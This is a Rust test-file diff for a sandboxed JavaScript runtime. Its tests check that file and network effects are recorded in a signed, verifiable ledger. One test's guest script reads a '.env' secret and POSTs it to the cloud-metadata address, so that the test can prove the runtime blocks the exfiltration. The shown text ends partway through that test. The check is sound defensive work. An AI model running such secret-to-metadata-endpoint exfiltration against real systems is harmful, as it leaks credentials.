@@ -14,8 +14,11 @@
 //! as evidence that a real franken_engine binary executed the application.
 
 use frankenengine_node::{
-    config::{Config, PreferredRuntime, Profile},
-    ops::{engine_dispatcher::EngineDispatcher, telemetry_bridge::TelemetryBridge},
+    config::{Config, NetworkAllowlistEntry, PreferredRuntime, Profile},
+    ops::{
+        engine_dispatcher::{DispatchResolutionError, EngineDispatcher},
+        telemetry_bridge::TelemetryBridge,
+    },
     storage::frankensqlite_adapter::FrankensqliteAdapter,
 };
 use std::path::{Path, PathBuf};
@@ -72,6 +75,9 @@ fn create_fixture_engine_binary(dir: &Path) -> PathBuf {
 }
 
 /// Create a slow franken-engine fixture binary for timeout testing.
+/// See `create_failing_fixture_engine_binary` for the `not(engine)` gating
+/// rationale (bd-4f4f0/bd-rpo4f).
+#[cfg(not(feature = "engine"))]
 fn create_slow_fixture_engine_binary(dir: &Path, delay_secs: u64) -> PathBuf {
     let engine_path = dir.join("slow-franken-engine");
     #[cfg(unix)]
@@ -106,6 +112,10 @@ fn create_slow_fixture_engine_binary(dir: &Path, delay_secs: u64) -> PathBuf {
 }
 
 /// Create a franken-engine fixture binary that fails with a non-zero exit code.
+/// Only the `not(engine)` subprocess-dispatch tests spawn fixture engines
+/// (bd-4f4f0); with the `engine` feature the FrankenEngine plan executes
+/// natively and never runs an external binary.
+#[cfg(not(feature = "engine"))]
 fn create_failing_fixture_engine_binary(dir: &Path, exit_code: i32) -> PathBuf {
     let engine_path = dir.join("failing-franken-engine");
     #[cfg(unix)]
@@ -139,6 +149,9 @@ fn create_failing_fixture_engine_binary(dir: &Path, exit_code: i32) -> PathBuf {
 }
 
 /// Create a franken-engine fixture binary that terminates abnormally.
+/// See `create_failing_fixture_engine_binary` for the `not(engine)` gating
+/// rationale (bd-4f4f0).
+#[cfg(not(feature = "engine"))]
 fn create_crashing_fixture_engine_binary(dir: &Path) -> PathBuf {
     let engine_path = dir.join("crashing-franken-engine");
     #[cfg(unix)]
@@ -185,7 +198,16 @@ fn test_native_engine_execution_with_telemetry() {
 
     let config = balanced_config();
 
-    let dispatcher = EngineDispatcher::new(None, PreferredRuntime::FrankenEngine);
+    // bd-rpo4f: pin an explicit fixture engine placeholder so the dispatch
+    // resolution gate passes deterministically on every host. With the
+    // `engine` feature, execution is native and in-process — the placeholder
+    // is never spawned; it only satisfies the availability check, which can
+    // never resolve from candidates because no `franken-engine` binary is
+    // shipped anywhere (bd-zi9hj). Previously `None` made this test
+    // host-dependent (and unreachable: the suite died at the first
+    // unavailable-resolution exit(127) before this test reported).
+    let fixture_engine = create_fixture_engine_binary(temp_dir.path());
+    let dispatcher = EngineDispatcher::new(Some(fixture_engine), PreferredRuntime::FrankenEngine);
     // Create test telemetry bridge
     let socket_path = temp_dir.path().join("test-telemetry.sock");
     let adapter = Arc::new(Mutex::new(FrankensqliteAdapter::default()));
@@ -217,6 +239,1230 @@ fn test_native_engine_execution_with_telemetry() {
         telemetry.drain_duration_ms < 10000,
         "Telemetry drain should complete within reasonable time"
     );
+}
+
+/// bd-5r99w.12 (mock-free e2e, product apex): a real, idiomatic JS program that
+/// performs fs effects, run through the PUBLIC `dispatch_run` path, surfaces a
+/// signed, SDK-verifiable host-effect ledger in `run --json` — and the bytes
+/// really hit the sandbox. No mocks: real parser/lowering, real `SandboxedHostIo`
+/// performing genuine fs I/O, real `EffectReceipt` hash chain, real verifier SDK
+/// re-deriving the chain offline. This is the operator-facing payoff of the whole
+/// trust-native effect pipeline: `franken-node run` showing WHAT the program did
+/// to the host under policy.
+#[test]
+#[cfg(feature = "engine")]
+fn run_surfaces_signed_host_effect_ledger_bd_5r99w_12() {
+    let temp_dir = TempDir::new().expect("Failed to create temp dir");
+    let app_path = create_test_app(
+        temp_dir.path(),
+        "app.js",
+        "require('fs').writeFileSync('out.txt', 'real effect bytes');\n\
+         require('fs').readFileSync('out.txt');\n",
+    );
+
+    // legacy-risky grants both fs_read and fs_write so both effects execute.
+    let config = Config {
+        profile: Profile::LegacyRisky,
+        ..Config::default()
+    };
+
+    // A dummy engine binary in a separate directory only satisfies dispatch-plan
+    // resolution (the path must exist). With the `engine` feature, execution runs
+    // IN-PROCESS via the native path and never executes this binary, so the
+    // sandbox (the app dir) stays clean and the run is hermetic.
+    let engine_dir = TempDir::new().expect("Failed to create engine dir");
+    let engine_path = create_fixture_engine_binary(engine_dir.path());
+    let dispatcher = EngineDispatcher::new(Some(engine_path), PreferredRuntime::FrankenEngine);
+    let report = dispatcher
+        .dispatch_run(&app_path, &config, "legacy-risky", &[], 0)
+        .expect("native run with host effects should succeed");
+
+    assert_eq!(report.runtime, "franken_engine");
+    assert!(!report.used_fallback_runtime);
+
+    // The write really hit the sandbox root (the app's directory).
+    assert_eq!(
+        std::fs::read(temp_dir.path().join("out.txt")).expect("written file on disk"),
+        b"real effect bytes",
+        "writeFileSync must have produced a real file in the sandbox root"
+    );
+
+    // The signed host-effect ledger is surfaced honestly.
+    let ledger = report
+        .host_effect_ledger
+        .as_ref()
+        .expect("native run must surface a host-effect ledger");
+    assert_eq!(ledger.schema_version, "host-effect-ledger-v1.0");
+    assert_eq!(
+        ledger.effect_count, 2,
+        "expected fs_write + fs_read, got {:?}",
+        ledger.entries
+    );
+    assert_eq!(ledger.allowed_count, 2);
+    assert_eq!(ledger.denied_count, 0);
+    let kinds: Vec<&str> = ledger
+        .entries
+        .iter()
+        .map(|entry| entry.receipt.effect_kind.label())
+        .collect();
+    assert_eq!(kinds, vec!["fs_write", "fs_read"]);
+
+    // It auto-surfaces in `run --json` (the report is the run --json payload's
+    // `dispatch` field).
+    let json = serde_json::to_string(&report).expect("serialize run report as run --json");
+    assert!(
+        json.contains("\"host_effect_ledger\""),
+        "run --json must include the host_effect_ledger"
+    );
+    assert!(json.contains("\"fs_write\"") && json.contains("\"fs_read\""));
+
+    // An external auditor re-derives the chain offline from the run --json ledger
+    // entries alone, with the public verifier SDK — no trust in this runtime.
+    let entries_json = serde_json::to_string(&ledger.entries).expect("serialize ledger entries");
+    let sdk_entries: Vec<frankenengine_verifier_sdk::bundle::EffectReceiptChainEntry> =
+        serde_json::from_str(&entries_json)
+            .expect("verifier SDK accepts the run --json ledger wire shape");
+    let sdk = frankenengine_verifier_sdk::VerifierSdk::new("verifier://bd-5r99w-12-e2e");
+    let verdict = sdk
+        .verify_effect_chain_entries(&sdk_entries)
+        .expect("verifier SDK re-derives the effect chain offline");
+    assert_eq!(verdict.effect_count, 2);
+    assert_eq!(verdict.head_chain_hash, ledger.chain_head_hash);
+}
+
+/// bd-656a2 / bd-3894s (http leg, mock-free e2e close-out): a real, idiomatic JS
+/// program that performs an `http.get` egress, run through the PUBLIC
+/// `dispatch_run` path, surfaces a signed, SDK-verifiable `http_request` effect
+/// in the host-effect ledger — and the framed request really reaches a loopback
+/// listener. No mocks: real parser/lowering of `require('http').get(url)` to the
+/// engine's `net:request` HostCall, the product-layer `SsrfGatedHostIo` policy
+/// gate (config-allowlisted for the loopback sink) authorizing it, the engine's
+/// real `SandboxedHostIo` network mechanism connecting and sending, a real
+/// `EffectReceipt` hash chain, and the verifier SDK re-deriving the chain offline.
+///
+/// This is the third L1 proof-carrying subject (`http.request`) coming online
+/// end to end — the close-out evidence for the http producer (bd-656a2) and the
+/// remaining REQUIRED subject for bd-f5b04.2.4's GREEN acceptance bar.
+#[test]
+#[cfg(feature = "engine")]
+fn run_surfaces_signed_http_request_effect_ledger_bd_656a2() {
+    use std::io::{Read, Write};
+    use std::net::TcpListener;
+
+    // A loopback listener that accepts exactly one connection and reads the
+    // framed request the engine's network mechanism sends. Bound BEFORE the run
+    // so the guest's connect always finds it listening. bd-3894s slice (4): the
+    // engine now does a single-socket request/response round trip, so the sink
+    // reads the (half-closed) request to EOF, then replies and closes so the
+    // guest's response read terminates.
+    let listener = TcpListener::bind("127.0.0.1:0").expect("bind loopback sink");
+    let addr = listener.local_addr().expect("listener addr");
+    let server = std::thread::spawn(move || {
+        let (mut stream, _peer) = listener.accept().expect("accept guest egress");
+        stream
+            .set_read_timeout(Some(Duration::from_secs(5)))
+            .expect("read timeout");
+        let mut received = Vec::new();
+        let _ = stream.read_to_end(&mut received);
+        let _ = stream.write_all(
+            b"HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nContent-Length: 2\r\n\r\nok",
+        );
+        let _ = stream.flush();
+        received
+    });
+
+    // An idiomatic guest program performing a single HTTP GET. The lowering
+    // forwards the URL operand to the engine's `net:request` HostCall; bd-3894s
+    // slice (4) makes the call evaluate to the parsed response object, but this
+    // e2e asserts the recorded host-effect ledger, which is the load-bearing proof.
+    let temp_dir = TempDir::new().expect("Failed to create temp dir");
+    let source = format!(
+        "require('http').get('http://{}/');\n",
+        addr // host:port form, e.g. 127.0.0.1:54321
+    );
+    let app_path = create_test_app(temp_dir.path(), "app.js", &source);
+
+    // legacy-risky grants network_egress so the egress hostcall is authorized at
+    // the engine layer; the product-layer SSRF gate still governs the endpoint.
+    // The default policy is fail-closed (Block) and would deny loopback, so the
+    // operator allowlists exactly this loopback sink — the config-driven exception
+    // that `SsrfGatedHostIo::from_network_policy` turns into a signed receipt.
+    let mut config = Config {
+        profile: Profile::LegacyRisky,
+        ..Config::default()
+    };
+    config
+        .security
+        .network_policy
+        .allowlist
+        .push(NetworkAllowlistEntry {
+            host: "127.0.0.1".to_string(),
+            port: None,
+            reason: "e2e: permit the loopback test sink".to_string(),
+        });
+
+    let engine_dir = TempDir::new().expect("Failed to create engine dir");
+    let engine_path = create_fixture_engine_binary(engine_dir.path());
+    let dispatcher = EngineDispatcher::new(Some(engine_path), PreferredRuntime::FrankenEngine);
+    let report = dispatcher
+        .dispatch_run(&app_path, &config, "legacy-risky", &[], 0)
+        .expect("native run with an allowlisted http egress should succeed");
+
+    assert_eq!(report.runtime, "franken_engine");
+    assert!(!report.used_fallback_runtime);
+
+    // The framed request really reached the loopback listener (the mechanism ran).
+    let received = server.join().expect("server thread");
+    let wire = String::from_utf8_lossy(&received);
+    assert!(
+        wire.starts_with("GET / HTTP/1.1\r\n"),
+        "the loopback sink must observe the engine-framed GET request, got {wire:?}"
+    );
+    assert!(
+        wire.contains(&format!("Host: {addr}\r\n")),
+        "the framed request must carry the Host header for {addr}, got {wire:?}"
+    );
+
+    // The signed host-effect ledger surfaces the egress as an `http_request`.
+    let ledger = report
+        .host_effect_ledger
+        .as_ref()
+        .expect("native http run must surface a host-effect ledger");
+    assert_eq!(ledger.schema_version, "host-effect-ledger-v1.0");
+    assert_eq!(
+        ledger.effect_count, 1,
+        "expected a single http_request effect, got {:?}",
+        ledger.entries
+    );
+    assert_eq!(ledger.allowed_count, 1);
+    assert_eq!(ledger.denied_count, 0);
+    assert_eq!(
+        ledger.entries[0].receipt.effect_kind.label(),
+        "http_request",
+        "the egress must be recorded as an http_request effect"
+    );
+
+    // It auto-surfaces in `run --json`.
+    let json = serde_json::to_string(&report).expect("serialize run report as run --json");
+    assert!(
+        json.contains("\"host_effect_ledger\"") && json.contains("\"http_request\""),
+        "run --json must include the http_request host-effect ledger entry"
+    );
+
+    // An external auditor re-derives the chain offline from the ledger entries
+    // alone, with the public verifier SDK — no trust in this runtime.
+    let entries_json = serde_json::to_string(&ledger.entries).expect("serialize ledger entries");
+    let sdk_entries: Vec<frankenengine_verifier_sdk::bundle::EffectReceiptChainEntry> =
+        serde_json::from_str(&entries_json)
+            .expect("verifier SDK accepts the run --json ledger wire shape");
+    let sdk = frankenengine_verifier_sdk::VerifierSdk::new("verifier://bd-656a2-http-e2e");
+    let verdict = sdk
+        .verify_effect_chain_entries(&sdk_entries)
+        .expect("verifier SDK re-derives the http effect chain offline");
+    assert_eq!(verdict.effect_count, 1);
+    assert_eq!(verdict.head_chain_hash, ledger.chain_head_hash);
+}
+
+/// bd-3894s slice (5) (https leg, mock-free e2e — real TLS): a real JS program
+/// performing `require('https').get('https://127.0.0.1:PORT/')` runs through the
+/// PUBLIC `dispatch_run` path against a REAL rustls TLS listener on loopback.
+/// The engine's wire builder marks the effect `use_tls` (https scheme), the
+/// SSRF gate authorizes the allowlisted endpoint, and the network mechanism
+/// performs the round trip inside a genuine TLS session: the listener only
+/// observes the framed GET AFTER a successful handshake + decrypt (a plaintext
+/// egress could never produce it), trust in the test anchor flows through the
+/// operator config seam `[security.network_policy].tls_extra_roots_pem_path`,
+/// and the signed host-effect ledger surfaces the egress as an allowed
+/// `http_request` effect that the public verifier SDK re-derives offline.
+#[test]
+#[cfg(feature = "engine")]
+fn run_surfaces_signed_https_request_effect_ledger_bd_3894s() {
+    use std::io::{Read, Write};
+    use std::net::TcpListener;
+
+    // A fresh self-signed anchor for 127.0.0.1 and a one-shot rustls server.
+    let certified = rcgen::generate_simple_self_signed(vec!["127.0.0.1".to_string()])
+        .expect("generate self-signed certificate");
+    let cert_pem = certified.cert.pem();
+    let cert_der = certified.cert.der().clone();
+    let key_der = rustls_pki_types::PrivateKeyDer::Pkcs8(certified.key_pair.serialize_der().into());
+    let tls_provider = Arc::new(rustls::crypto::ring::default_provider());
+    let server_config = rustls::ServerConfig::builder_with_provider(tls_provider)
+        .with_safe_default_protocol_versions()
+        .expect("server protocol versions")
+        .with_no_client_auth()
+        .with_single_cert(vec![cert_der], key_der)
+        .expect("server certificate");
+    let server_config = Arc::new(server_config);
+
+    let listener = TcpListener::bind("127.0.0.1:0").expect("bind loopback TLS sink");
+    let addr = listener.local_addr().expect("listener addr");
+    let server = std::thread::spawn(move || {
+        let (tcp, _peer) = listener.accept().expect("accept guest egress");
+        tcp.set_read_timeout(Some(Duration::from_secs(5)))
+            .expect("read timeout");
+        let conn = rustls::ServerConnection::new(server_config).expect("server connection");
+        let mut tls = rustls::StreamOwned::new(conn, tcp);
+        // Read the decrypted request up to the header terminator (bodyless GET).
+        let mut received = Vec::new();
+        let mut buf = [0u8; 1024];
+        loop {
+            match tls.read(&mut buf) {
+                Ok(0) => break,
+                Ok(n) => {
+                    received.extend_from_slice(&buf[..n]);
+                    if received.windows(4).any(|w| w == b"\r\n\r\n") {
+                        break;
+                    }
+                }
+                Err(_) => break,
+            }
+        }
+        let _ = tls.write_all(
+            b"HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nContent-Length: 2\r\n\r\nok",
+        );
+        let _ = tls.flush();
+        tls.conn.send_close_notify();
+        let _ = tls.flush();
+        received
+    });
+
+    // An idiomatic guest program performing a single HTTPS GET.
+    let temp_dir = TempDir::new().expect("Failed to create temp dir");
+    let source = format!("require('https').get('https://{addr}/');\n");
+    let app_path = create_test_app(temp_dir.path(), "app.js", &source);
+
+    // The operator trusts the test anchor via the config seam (ADDED to the
+    // webpki roots) and allowlists the loopback sink through the SSRF gate.
+    let roots_path = temp_dir.path().join("extra-roots.pem");
+    std::fs::write(&roots_path, cert_pem).expect("write extra TLS roots PEM");
+    let mut config = Config {
+        profile: Profile::LegacyRisky,
+        ..Config::default()
+    };
+    config.security.network_policy.tls_extra_roots_pem_path =
+        Some(roots_path.to_string_lossy().into_owned());
+    config
+        .security
+        .network_policy
+        .allowlist
+        .push(NetworkAllowlistEntry {
+            host: "127.0.0.1".to_string(),
+            port: None,
+            reason: "e2e: permit the loopback TLS test sink".to_string(),
+        });
+
+    let engine_dir = TempDir::new().expect("Failed to create engine dir");
+    let engine_path = create_fixture_engine_binary(engine_dir.path());
+    let dispatcher = EngineDispatcher::new(Some(engine_path), PreferredRuntime::FrankenEngine);
+    let report = dispatcher
+        .dispatch_run(&app_path, &config, "legacy-risky", &[], 0)
+        .expect("native run with an allowlisted https egress should succeed");
+
+    assert_eq!(report.runtime, "franken_engine");
+    assert!(!report.used_fallback_runtime);
+
+    // The framed request reached the listener THROUGH the TLS session: these
+    // are decrypted bytes, so a plaintext egress (or a failed handshake) could
+    // never produce them.
+    let received = server.join().expect("server thread");
+    let wire = String::from_utf8_lossy(&received);
+    assert!(
+        wire.starts_with("GET / HTTP/1.1\r\n"),
+        "the TLS sink must observe the decrypted engine-framed GET, got {wire:?}"
+    );
+    assert!(
+        wire.contains(&format!("Host: {addr}\r\n")),
+        "the framed request must carry the Host header for {addr}, got {wire:?}"
+    );
+
+    // The signed host-effect ledger surfaces the TLS egress as an `http_request`.
+    let ledger = report
+        .host_effect_ledger
+        .as_ref()
+        .expect("native https run must surface a host-effect ledger");
+    assert_eq!(ledger.schema_version, "host-effect-ledger-v1.0");
+    assert_eq!(
+        ledger.effect_count, 1,
+        "expected a single http_request effect, got {:?}",
+        ledger.entries
+    );
+    assert_eq!(ledger.allowed_count, 1);
+    assert_eq!(ledger.denied_count, 0);
+    assert_eq!(
+        ledger.entries[0].receipt.effect_kind.label(),
+        "http_request",
+        "the TLS egress must be recorded as an http_request effect"
+    );
+
+    // An external auditor re-derives the chain offline with the public SDK.
+    let entries_json = serde_json::to_string(&ledger.entries).expect("serialize ledger entries");
+    let sdk_entries: Vec<frankenengine_verifier_sdk::bundle::EffectReceiptChainEntry> =
+        serde_json::from_str(&entries_json)
+            .expect("verifier SDK accepts the run --json ledger wire shape");
+    let sdk = frankenengine_verifier_sdk::VerifierSdk::new("verifier://bd-3894s-https-e2e");
+    let verdict = sdk
+        .verify_effect_chain_entries(&sdk_entries)
+        .expect("verifier SDK re-derives the https effect chain offline");
+    assert_eq!(verdict.effect_count, 1);
+    assert_eq!(verdict.head_chain_hash, ledger.chain_head_hash);
+}
+
+/// bd-3894s slice (5): an https egress whose server anchor is NOT trusted
+/// (no `tls_extra_roots_pem_path`, self-signed peer) fails certificate
+/// verification inside the network mechanism — fail-closed. The run still
+/// completes and the signed ledger records the attempt honestly: the effect's
+/// SSRF authorization succeeded (allowlisted endpoint) but the round trip
+/// errored, so no forged "response" ever reaches the guest and no plaintext
+/// fallback occurs (the sink observes zero decrypted request bytes).
+#[test]
+#[cfg(feature = "engine")]
+fn run_https_untrusted_anchor_fails_closed_bd_3894s() {
+    use std::io::{Read, Write};
+    use std::net::TcpListener;
+
+    let certified = rcgen::generate_simple_self_signed(vec!["127.0.0.1".to_string()])
+        .expect("generate self-signed certificate");
+    let cert_der = certified.cert.der().clone();
+    let key_der = rustls_pki_types::PrivateKeyDer::Pkcs8(certified.key_pair.serialize_der().into());
+    let tls_provider = Arc::new(rustls::crypto::ring::default_provider());
+    let server_config = rustls::ServerConfig::builder_with_provider(tls_provider)
+        .with_safe_default_protocol_versions()
+        .expect("server protocol versions")
+        .with_no_client_auth()
+        .with_single_cert(vec![cert_der], key_der)
+        .expect("server certificate");
+    let server_config = Arc::new(server_config);
+
+    let listener = TcpListener::bind("127.0.0.1:0").expect("bind loopback TLS sink");
+    let addr = listener.local_addr().expect("listener addr");
+    let server = std::thread::spawn(move || {
+        let (tcp, _peer) = listener.accept().expect("accept guest egress");
+        tcp.set_read_timeout(Some(Duration::from_secs(5)))
+            .expect("read timeout");
+        let conn = rustls::ServerConnection::new(server_config).expect("server connection");
+        let mut tls = rustls::StreamOwned::new(conn, tcp);
+        // The client must abort the handshake (untrusted anchor); any read
+        // error or clean close yields zero decrypted request bytes.
+        let mut received = Vec::new();
+        let mut buf = [0u8; 1024];
+        loop {
+            match tls.read(&mut buf) {
+                Ok(0) | Err(_) => break,
+                Ok(n) => {
+                    received.extend_from_slice(&buf[..n]);
+                    if received.windows(4).any(|w| w == b"\r\n\r\n") {
+                        break;
+                    }
+                }
+            }
+        }
+        let _ = tls.write_all(b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nok");
+        let _ = tls.flush();
+        received
+    });
+
+    let temp_dir = TempDir::new().expect("Failed to create temp dir");
+    let source = format!("require('https').get('https://{addr}/');\n");
+    let app_path = create_test_app(temp_dir.path(), "app.js", &source);
+
+    // Allowlist the endpoint (SSRF authorizes it) but deliberately do NOT
+    // install the anchor: certificate verification is the layer under test.
+    let mut config = Config {
+        profile: Profile::LegacyRisky,
+        ..Config::default()
+    };
+    config
+        .security
+        .network_policy
+        .allowlist
+        .push(NetworkAllowlistEntry {
+            host: "127.0.0.1".to_string(),
+            port: None,
+            reason: "e2e: SSRF-authorize the sink; TLS verification must still fail".to_string(),
+        });
+
+    let engine_dir = TempDir::new().expect("Failed to create engine dir");
+    let engine_path = create_fixture_engine_binary(engine_dir.path());
+    let dispatcher = EngineDispatcher::new(Some(engine_path), PreferredRuntime::FrankenEngine);
+    let report = dispatcher
+        .dispatch_run(&app_path, &config, "legacy-risky", &[], 0)
+        .expect("the run completes; the failed TLS effect is recorded, not fatal");
+
+    assert_eq!(report.runtime, "franken_engine");
+
+    // No decrypted request bytes ever reached the peer.
+    let received = server.join().expect("server thread");
+    assert!(
+        received.is_empty(),
+        "certificate verification failure must abort before any request bytes cross, got {:?}",
+        String::from_utf8_lossy(&received)
+    );
+
+    // The ledger records the attempt honestly: a single fail-closed receipt,
+    // nothing allowed, no fabricated response.
+    let ledger = report
+        .host_effect_ledger
+        .as_ref()
+        .expect("native https run must surface a host-effect ledger");
+    assert_eq!(
+        ledger.allowed_count, 0,
+        "a failed TLS handshake must not be recorded as an allowed effect: {:?}",
+        ledger.entries
+    );
+    assert_eq!(
+        ledger.denied_count, 1,
+        "the failed TLS egress must surface as a fail-closed receipt: {:?}",
+        ledger.entries
+    );
+    assert_eq!(
+        ledger.entries[0].receipt.effect_kind.label(),
+        "http_request"
+    );
+}
+
+/// bd-3894s slice (2b) (http leg, mock-free e2e — writable ClientRequest body): a
+/// real JS program that builds an HTTP request body INCREMENTALLY via the writable
+/// `ClientRequest` stream —
+/// `const req = http.request(url, { method: 'POST', ... }); req.write(a);
+/// req.write(b); req.end(c);` — run through the PUBLIC `dispatch_run` path. The
+/// `http.request` call lowers to the engine's `net:client_request` HostCall (it
+/// builds the ClientRequest object WITHOUT egressing); the egress fires only on
+/// `req.end()`, carrying the body ACCUMULATED across the `write`/`end` calls. The
+/// framed POST really reaches a loopback listener with the assembled body, and the
+/// signed host-effect ledger surfaces the egress as an allowed `http_request`
+/// effect (the same proof-carrying path as the immediate `http.get` form, so the
+/// body lands in the ledger with identical fidelity — a POST-with-body built via
+/// `req.write` is no longer dropped or recorded as a benign GET).
+#[test]
+#[cfg(feature = "engine")]
+fn run_surfaces_signed_http_request_write_end_body_ledger_bd_3894s() {
+    use std::io::{Read, Write};
+    use std::net::TcpListener;
+
+    // A loopback listener that accepts one connection, reads the framed request to
+    // EOF (the half-closed request half), then replies and closes so the guest's
+    // response read terminates (the slice-4 single-socket round trip).
+    let listener = TcpListener::bind("127.0.0.1:0").expect("bind loopback sink");
+    let addr = listener.local_addr().expect("listener addr");
+    let server = std::thread::spawn(move || {
+        let (mut stream, _peer) = listener.accept().expect("accept guest egress");
+        stream
+            .set_read_timeout(Some(Duration::from_secs(5)))
+            .expect("read timeout");
+        let mut received = Vec::new();
+        let _ = stream.read_to_end(&mut received);
+        let _ = stream.write_all(b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nok");
+        let _ = stream.flush();
+        received
+    });
+
+    // An idiomatic guest program that streams the request body: `http.request`
+    // returns a writable ClientRequest, `req.write` appends each chunk, and
+    // `req.end` sends the assembled body. The lowering routes `http.request` to
+    // `net:client_request` (deferred egress), so nothing is sent until `req.end()`.
+    let temp_dir = TempDir::new().expect("Failed to create temp dir");
+    let source = format!(
+        "const http = require('http');\n\
+         const req = http.request('http://{addr}/submit', {{ method: 'POST', headers: {{ 'Content-Type': 'text/plain' }} }});\n\
+         req.write('Hello, ');\n\
+         req.write('world');\n\
+         req.end('!');\n"
+    );
+    let app_path = create_test_app(temp_dir.path(), "app.js", &source);
+
+    // legacy-risky grants network_egress (authorizing the `net:client_request`
+    // creation AND the deferred `.end()` egress at the engine capability layer);
+    // the operator allowlists the loopback sink so the product-layer SSRF gate
+    // authorizes this exact endpoint.
+    let mut config = Config {
+        profile: Profile::LegacyRisky,
+        ..Config::default()
+    };
+    config
+        .security
+        .network_policy
+        .allowlist
+        .push(NetworkAllowlistEntry {
+            host: "127.0.0.1".to_string(),
+            port: None,
+            reason: "e2e: permit the loopback test sink".to_string(),
+        });
+
+    let engine_dir = TempDir::new().expect("Failed to create engine dir");
+    let engine_path = create_fixture_engine_binary(engine_dir.path());
+    let dispatcher = EngineDispatcher::new(Some(engine_path), PreferredRuntime::FrankenEngine);
+    let report = dispatcher
+        .dispatch_run(&app_path, &config, "legacy-risky", &[], 0)
+        .expect("native run with an allowlisted http.request write/end egress should succeed");
+
+    assert_eq!(report.runtime, "franken_engine");
+    assert!(!report.used_fallback_runtime);
+
+    // The framed POST with the ACCUMULATED body really reached the loopback sink —
+    // the load-bearing proof the writable-stream body was assembled and sent.
+    let received = server.join().expect("server thread");
+    let wire = String::from_utf8_lossy(&received);
+    assert!(
+        wire.starts_with("POST /submit HTTP/1.1\r\n"),
+        "the loopback sink must observe the engine-framed POST request, got {wire:?}"
+    );
+    assert!(
+        wire.contains("Content-Type: text/plain\r\n"),
+        "the request headers must be framed onto the wire, got {wire:?}"
+    );
+    assert!(
+        wire.contains("Content-Length: 13\r\n"),
+        "the assembled write/end body length (\"Hello, world!\") must be framed, got {wire:?}"
+    );
+    assert!(
+        wire.ends_with("\r\n\r\nHello, world!"),
+        "the body assembled across req.write/req.end must follow the blank-line terminator, got {wire:?}"
+    );
+
+    // The signed host-effect ledger surfaces the egress as an allowed http_request.
+    let ledger = report
+        .host_effect_ledger
+        .as_ref()
+        .expect("native http.request write/end run must surface a host-effect ledger");
+    assert_eq!(
+        ledger.effect_count, 1,
+        "expected a single http_request effect from req.end(), got {:?}",
+        ledger.entries
+    );
+    assert_eq!(ledger.allowed_count, 1);
+    assert_eq!(ledger.denied_count, 0);
+    assert_eq!(
+        ledger.entries[0].receipt.effect_kind.label(),
+        "http_request",
+        "the deferred req.end() egress must be recorded as an http_request effect"
+    );
+
+    // An external auditor re-derives the chain offline from the ledger entries.
+    let entries_json = serde_json::to_string(&ledger.entries).expect("serialize ledger entries");
+    let sdk_entries: Vec<frankenengine_verifier_sdk::bundle::EffectReceiptChainEntry> =
+        serde_json::from_str(&entries_json)
+            .expect("verifier SDK accepts the run --json ledger wire shape");
+    let sdk = frankenengine_verifier_sdk::VerifierSdk::new("verifier://bd-3894s-clientrequest-e2e");
+    let verdict = sdk
+        .verify_effect_chain_entries(&sdk_entries)
+        .expect("verifier SDK re-derives the http effect chain offline");
+    assert_eq!(verdict.effect_count, 1);
+    assert_eq!(verdict.head_chain_hash, ledger.chain_head_hash);
+}
+
+/// bd-plhag (information-flow labeling on the run path): a real guest reads a
+/// recognized secret-bearing file (`.env`) and tries to POST its contents to
+/// the cloud-metadata endpoint. The product-layer SSRF gate denies that
+/// endpoint before any socket opens, so the egress is a DENIED receipt — and
+/// because its (framed) payload contains the secret bytes read earlier, the
+/// signed ledger records it as a flow BLOCK (`flow_policy_verdict = blocked`)
+/// carrying the secret's `label_set_commitment`. The verifier SDK then proves
+/// OFFLINE, with zero trust in this runtime, that the forbidden label was
+/// blocked before reaching the sink — a real non-exfiltration guarantee.
+#[test]
+#[cfg(feature = "engine")]
+fn run_blocks_secret_egress_and_proves_non_exfiltration_bd_plhag() {
+    use frankenengine_node::security::lineage_tracker::secret_file_label_set_commitment;
+
+    let temp_dir = TempDir::new().expect("Failed to create temp dir");
+    // A real secret-bearing file, long enough to clear the min-sample bound.
+    std::fs::write(
+        temp_dir.path().join(".env"),
+        "SECRET_TOKEN=plhag-flow-e2e-do-not-exfiltrate-abcdef0123456789\n",
+    )
+    .expect("write .env fixture secret");
+    // The guest reads the secret then POSTs it to the cloud-metadata endpoint.
+    let source = "const fs = require('fs');\n\
+         const secret = fs.readFileSync('.env', 'utf8');\n\
+         const http = require('http');\n\
+         const req = http.request('http://169.254.169.254/exfil', { method: 'POST' });\n\
+         req.end(secret);\n";
+    let app_path = create_test_app(temp_dir.path(), "app.js", source);
+
+    // legacy-risky grants fs + network_egress at the engine capability layer;
+    // the DEFAULT network policy (Block, no allowlist) denies the cloud-metadata
+    // endpoint at the product-layer SSRF gate before any socket opens.
+    let config = Config {
+        profile: Profile::LegacyRisky,
+        ..Config::default()
+    };
+    let engine_dir = TempDir::new().expect("Failed to create engine dir");
+    let engine_path = create_fixture_engine_binary(engine_dir.path());
+    let dispatcher = EngineDispatcher::new(Some(engine_path), PreferredRuntime::FrankenEngine);
+    let report = dispatcher
+        .dispatch_run(&app_path, &config, "legacy-risky", &[], 0)
+        .expect("native run with a denied secret egress should still complete");
+
+    let ledger = report
+        .host_effect_ledger
+        .as_ref()
+        .expect("native run must surface a host-effect ledger");
+    let secret_commitment = secret_file_label_set_commitment();
+
+    // The sensitive read is labeled (a source), but a read is not a sink.
+    let read = ledger
+        .entries
+        .iter()
+        .find(|e| e.receipt.effect_kind.label() == "fs_read")
+        .expect("an fs_read receipt for the .env read");
+    assert_eq!(
+        read.receipt.label_set_commitment, secret_commitment,
+        "the secret-file read must carry the secret label commitment"
+    );
+    assert_eq!(read.receipt.flow_policy_verdict.label(), "label_clean");
+
+    // The denied egress carrying the secret is a flow BLOCK.
+    let egress = ledger
+        .entries
+        .iter()
+        .find(|e| e.receipt.effect_kind.label() == "http_request")
+        .expect("an http_request receipt for the egress");
+    assert!(
+        matches!(
+            egress.receipt.policy_outcome,
+            frankenengine_node::runtime::effect_receipt::PolicyOutcome::Denied { .. }
+        ),
+        "the cloud-metadata endpoint must be SSRF-denied"
+    );
+    assert_eq!(
+        egress.receipt.flow_policy_verdict.label(),
+        "blocked",
+        "a denied egress carrying the secret is a flow block"
+    );
+    assert_eq!(egress.receipt.label_set_commitment, secret_commitment);
+    assert!(ledger.denied_count >= 1);
+
+    // OFFLINE proof: the verifier SDK re-derives the chain and proves the
+    // forbidden label was blocked before the sink.
+    let entries_json = serde_json::to_string(&ledger.entries).expect("serialize ledger entries");
